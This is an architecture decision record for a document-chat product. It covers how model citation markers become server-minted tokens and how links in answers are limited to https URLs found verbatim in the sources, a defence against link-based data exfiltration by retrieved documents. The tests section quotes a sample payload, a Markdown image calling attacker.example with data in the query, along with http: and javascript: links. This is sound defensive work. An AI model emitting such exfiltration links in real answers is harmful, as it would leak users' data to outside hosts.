# ADR 0064: Citation markers and allowed links

- **Status:** Accepted
- **Date:** 2026-10-18
- **Decided by:** Product owner and architect
- **Specified in:** 12-chat-pipeline.md, 11-api.md, 10-web-client.md, 13-conversations-and-memory.md, 80-data-model.md, 82-security.md, 84-testing.md
- **Related ADRs:** 0055, 0056, 0057, 0062, 0063, 0065, 0068, 0069, 0084, 0087, 0152

## Context

A citation must point at a chunk the API actually sent to the model, and nothing a document or the model writes may become a clickable citation or link, because retrieved documents are written by other people and a link in an answer could carry data out of the browser. The product numbers its citations, ties each one by a structured marker to a chunk that was actually retrieved, and opens it only through the authenticated API (ADR 0069). A URL in an answer becomes a link only when it uses `https:` and appears verbatim in a source used for that answer. Answer text streams as `delta` events and the citations follow as their own `citations` event as soon as the answer ends, so nothing in the answer stream is ever cut out to carry citations or suggestions.

Constraints:

- Model output streams in chunks whose boundaries fall anywhere, so a marker can be split across deltas.
- The client never sees source text, and citations arrive after the deltas, so it can't decide on its own which URLs a source contained: the API must send the list of allowed URLs.
- The client's Markdown renderer with GitHub-flavoured extensions (remark-gfm 4.0.1) turns bare URLs and `www.` text into links, so a link rule must apply to every link it produces, not only to explicit Markdown links.

## Decision

**What the model writes.** The platform rules (ADR 0063) ask the model to cite each statement that relies on a source with the source's identifier in square brackets, `[S2]`, several as `[S2][S5]`, using only identifiers from this request's `SOURCE` boundary lines.

**What the API accepts and mints.** Before parsing, the API deletes every U+27E6 (`⟦`) and U+27E7 (`⟧`) from the model's text, so only the API can produce a citation token. A complete marker matches, case-insensitively, the first pattern below, so `[S2]`, `[s2]`, `[ S2 ]`, `[S2, S5]` and `[S2; S5]` all count:

```text
complete marker:   \[\s*S(\d{1,2})(?:\s*[,;]\s*S(\d{1,2}))*\s*\]
partial suffix:    ^\[\s*(?:S\d{0,2}(?:\s*[,;]\s*(?:S\d{0,2})?)*)?$
allowed link:      https://[^\s<>"'{}|\\^\[\]`]+
```

Each complete marker is replaced by reserved citation tokens `⟦n⟧`, one per distinct known source it names, in the order it names them; repeats within the marker are skipped. `n` numbers distinct sources in order of first use across the answer (the first source cited is 1, the next new one 2) and runs from 1 to 16. A source is known only when this answer call received it: an ID that wasn't in the call's `SOURCE` blocks, a source flagged by screening (ADR 0062) and a source dropped by the token budget (ADR 0063) are all unknown, and their references are removed; a marker that names no known source is removed entirely.

**Markers split across deltas.** Unreleased model text sits in a buffer. After each model delta the parser deletes the reserved characters, appends the delta, replaces every complete marker, then finds the last `[` outside a replaced marker; when the text from that `[` to the end is at most 40 characters and matches the partial-suffix pattern (case-insensitive), it is held back, and everything before it is released as `delta` events of at most 4,000 characters. When the model stream ends, the whole buffer is released as plain text. The answer call sends no `stop` sequence.

**The `citations` event.** It is written as soon as the answer stream has ended and `finalize_turn` has stored the completed turn (ADR 0057), so the session is free for the next question when the client re-enables input. It lists one `Citation` per number, in number order: `number` (1 to 16), `title` (1 to 300 characters), `pageNumber` (integer ≥ 1, a page of the version's PDF, the converted PDF for a DOCX or PPTX), `headingPath` (0 to 8 strings of 1 to 200 characters), `contentType` (`application/pdf`, `application/vnd.openxmlformats-officedocument.wordprocessingml.document` or `application/vnd.openxmlformats-officedocument.presentationml.presentation`) and `openAs` (`pdf_page`, for every format; ADR 0069, ADR 0152). It never carries a document ID, version ID, chunk set ID, chunk key, index name or storage path; those stay in the turn's `StoredCitation` entries (`number`, `sourceId`, `chunkKey`, `searchIndexId`, `physicalIndexId`, `documentId`, `documentVersionId`, `chunkSetId`, `title`, `pageNumber`, `headingPath`, `contentType`, `openAs`), whose public projection `CitationView` equals `Citation`, so live and stored turns share one model.

**The `allowedLinks` list.** The same event carries `allowedLinks`: every distinct URL that appears verbatim in the bodies of the `SOURCE` blocks actually sent to the model (after screening and the budget), in first-seen order, at most 50 entries of at most 2,048 characters. Extraction uses the allowed-link pattern above (the scheme matched case-insensitively, the URL kept verbatim; the class also excludes the backtick); trailing `.`, `,`, `;`, `:`, `!`, `?`, `'`, `"`, `*` and `_` are trimmed repeatedly, and a trailing `)` is trimmed unless the URL contains an unmatched `(`. No other scheme is ever listed. The event is always written on success, with empty arrays when there are no citations or links, and both arrays are stored on the turn (`citations`, `allowedLinks`) and returned by session reads.

**What the client renders** (ADR 0084). A `⟦n⟧` shows as plain superscript `[n]` until `citations` arrives, then as a citation button when `n` is listed and as nothing when it isn't; inside link text or code it shows as `[n]`; no other bracketed text ever becomes a citation. A link is created only after `allowedLinks` has arrived, when its URL parses, uses `https:`, carries no user name or password, has at most 2,048 characters and its normalised form (`URL.href`) equals the normalised form of an entry; it opens in a new tab with `rel="noopener noreferrer"`. Every other link, autolinked bare URLs included, renders as its text.

**Removing tokens.** `docchat_core.chat.citations.strip_citation_tokens(text) -> str` removes every `⟦n⟧` and the single space directly before it ("The policy covers all sites ⟦1⟧, with two exceptions ⟦2⟧." becomes "The policy covers all sites, with two exceptions."). The conversation store uses it for history and `historyTokens`, the follow-ups call for its answer input (ADR 0065), and `docchat-ops user export` for exported answers, because a token's number points at a source of its own turn only.

**Interrupted answers and replays.** A turn cancelled by a disconnect, or ended by the deadline before finalisation, stores the text released so far with its tokens and the citations of the markers already replaced. A replay (ADR 0056) streams the stored answer in `delta` events of at most 2,000 characters that never split a token, then the stored `citations` and `allowedLinks`.

## Alternatives considered

- **Rendering whatever bracketed reference the model writes.** Lost: any bracketed text from a source or the model would become a citation, and a reference by name could open an arbitrary file.
- **Structured JSON output with citation spans.** Lost: plain streamed text shows the first words at once, while a JSON answer must be parsed incrementally and still needs the same reference checks; the answer call sends no `response_format` (ADR 0068).
- **Citations through tool calls.** Lost: the model has no tools, so its only output is text.
- **Showing source IDs (`S1`, `S5`) as the numbers.** Lost: gaps and rank order make the numbers jump; first-use numbering reads 1, 2, 3 in reading order.
- **Stop sequences or in-band trailers for citations or follow-ups.** Lost: a stop sequence ends the answer wherever it appears, and a trailer has to be cut out of the stream, so either can truncate an answer; citations and follow-ups travel as their own events.
- **Sending source text, or every URL of every retrieved chunk, to the client.** Lost: retrieved text stays on the server, and only URLs of sources actually sent could legitimately appear in the answer.
- **Removing disallowed URLs from the answer text on the server.** Lost: the renderer needs a rule for every link it creates anyway (autolinked URLs and reference links), one renderer rule covers live and stored turns, and the words stay readable as text.
- **`http:` links, or no links at all.** Lost: the product links exactly the `https:` URLs found verbatim in a used source; `http:` links would let an answer send requests in clear text, and no links at all would hide references the sources legitimately give.

## Consequences

- No text written by a document or the model can create a citation or a clickable link: tokens are minted only by the API, and a link needs the turn's allowlist; the web client's exfiltration test proves that an answer with an image or an unlisted URL makes no request to any other origin.
- Up to 40 characters of a possible partial marker wait for the next delta. A combined marker longer than 40 characters that splits across deltas is released as text, which the rules' one-identifier-per-bracket form avoids.
- U+27E6 and U+27E7 written by the model are deleted from the answer; a URL written in a form the trimming rule cuts differently, a 51st URL and a URL over 2,048 characters render as text, never as links.
- A model that cites in another form ("source 2") produces plain text with no citation; evaluation measures citation compliance once it exists.
- Tests: a marker split at every character position across two deltas yields the unsplit output; `[S2, S5]`, `[s2]` and `[ S2 ]` are accepted, unknown IDs removed, numbers follow first use and repeats reuse them, reserved characters in model text deleted, a 41-character suffix after `[` released at once, the buffer released at stream end; link extraction keeps `https` URLs verbatim, trims trailing punctuation and an unmatched `)`, excludes `http:`, `javascript:`, `data:` and `mailto:`, caps at 50 entries of 2,048 characters, keeps first-seen order and reads only the sources sent; a source holding `![x](https://attacker.example/p?q=data)`, an `http://` link and a `javascript:` link yields only the `https` URL; model output with `⟦9⟧` and `[S7]` when 3 sources were sent produces no token for 7 or 9; the strip helper removes tokens and the space before each; in the web client's unit tests, tokens `⟦1⟧` and `⟦7⟧` with citations 1 and 2 render one button for 1 and nothing for 7, and inside a link or code render as `[1]`.

## References

- remark-gfm 4.0.1 (autolink literals): https://www.npmjs.com/package/remark-gfm/v/4.0.1 (checked 2026-10-14)
- Chat Completions streaming chunks: https://learn.microsoft.com/en-us/rest/api/microsoft-foundry/azureopenai/chat (checked 2026-10-14)
